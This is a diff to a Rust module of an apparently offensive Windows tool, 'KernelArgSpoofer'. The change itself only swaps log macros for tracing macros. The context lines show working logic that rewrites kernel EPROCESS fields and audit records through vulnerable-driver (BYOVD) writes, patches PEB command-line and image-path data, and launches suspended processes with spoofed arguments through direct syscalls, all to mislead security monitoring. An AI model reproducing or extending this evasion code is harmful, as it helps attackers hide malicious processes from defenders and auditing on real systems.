@@ -457,7 +457,7 @@ fn resolve_eprocess_for_pid(target_pid: u32) -> Result<u64> {
                     target_pid
                 );
             }
-            log::info!(
+            tracing::info!(
                 "Resolved EPROCESS for PID {} at 0x{:016X}",
                 target_pid,
                 eprocess
@@ -555,7 +555,7 @@ impl KernelArgSpoofer {
             )
         })?;
 
-        log::info!(
+        tracing::info!(
             "KernelArgSpoofer initialized: build={}, kernel_base=0x{:016X}, cr3=0x{:016X}",
             build,
             kernel_base,
@@ -623,7 +623,7 @@ impl KernelArgSpoofer {
         // Phase 3: PEB consistency (user-space writes via BYOVD).
         self.spoof_peb_consistency(eprocess, &fake_path_utf16, &fake_args_utf16)?;
 
-        log::info!(
+        tracing::info!(
             "Kernel argument spoofing complete for PID {}: path={:?}, args={:?}",
             target_pid,
             fake_path,
@@ -802,7 +802,7 @@ impl KernelArgSpoofer {
             }
             .context("failed to update SeAuditProcessCreationInfo ImageFileName")?;
         } else {
-            log::warn!("SeAuditProcessCreationInfo is NULL — skipping audit info update");
+            tracing::warn!("SeAuditProcessCreationInfo is NULL — skipping audit info update");
         }
 
         // ── Step 6: Update EPROCESS.ImageFileName ──────────────────────
@@ -827,7 +827,7 @@ impl KernelArgSpoofer {
         }
         .context("failed to update EPROCESS.ImageFileName")?;
 
-        log::info!(
+        tracing::info!(
             "Kernel EPROCESS modification complete: ImageFileName={:?}, path={:?}, cmd={:?}",
             fake_name,
             fake_path,
@@ -951,7 +951,7 @@ impl KernelArgSpoofer {
             }
             .context("failed to update ImagePathName.Length in PEB")?;
         } else {
-            log::warn!(
+            tracing::warn!(
                 "PEB ImagePathName buffer too small ({} < {}) — PEB not fully consistent",
                 existing_path.maximum_length,
                 fake_path_utf16.len()
@@ -983,14 +983,14 @@ impl KernelArgSpoofer {
             }
             .context("failed to update CommandLine.Length in PEB")?;
         } else {
-            log::warn!(
+            tracing::warn!(
                 "PEB CommandLine buffer too small ({} < {}) — PEB not fully consistent",
                 existing_cmd.maximum_length,
                 fake_args_utf16.len()
             );
         }
 
-        log::info!("PEB consistency update complete for target process");
+        tracing::info!("PEB consistency update complete for target process");
         Ok(())
     }
 
@@ -1061,7 +1061,7 @@ impl KernelArgSpoofer {
         // SAFETY: This fallback is less safe.  We log a warning and prefer
         // the existing-buffer path.
 
-        log::warn!(
+        tracing::warn!(
             "Existing buffer too small (max={} need={}) — attempting to use \
              space after existing buffer at 0x{:016X}",
             existing.maximum_length,
@@ -1093,7 +1093,7 @@ impl KernelArgSpoofer {
     /// Clean up any fresh kernel pool allocations on failure.
     fn cleanup_on_failure(&mut self) {
         for (addr, size) in &self.pool_allocations {
-            log::warn!(
+            tracing::warn!(
                 "Cleaning up kernel pool allocation at 0x{:016X} ({} bytes)",
                 addr,
                 size
@@ -1234,7 +1234,7 @@ pub fn create_process_with_spoofed_args(
     let (pid, handle) = create_suspended_process(real_exe)
         .context("failed to create suspended process for argument spoofing")?;
 
-    log::info!(
+    tracing::info!(
         "Created suspended process PID={} for kernel arg spoofing",
         pid
     );
@@ -1248,7 +1248,7 @@ pub fn create_process_with_spoofed_args(
 
     if let Err(e) = result {
         // Kill the suspended process on failure — it has unspoofed args.
-        log::error!("Spoofing failed: {} — terminating suspended process PID={}", e, pid);
+        tracing::error!("Spoofing failed: {} — terminating suspended process PID={}", e, pid);
         let _ = unsafe {
             crate::syscall!("NtTerminateProcess", handle as u64, 1u64)
         };
@@ -1260,14 +1260,14 @@ pub fn create_process_with_spoofed_args(
         crate::syscall!("NtResumeThread", handle as u64, 0u64 as *mut u32 as u64)
     };
     if let Err(e) = resume_status {
-        log::warn!(
+        tracing::warn!(
             "NtResumeThread failed for PID={} ({}) — process may be stuck suspended",
             pid,
             e
         );
     }
 
-    log::info!(
+    tracing::info!(
         "Process PID={} created with spoofed args: fake_exe={:?}, fake_args={:?}",
         pid,
         fake_exe,
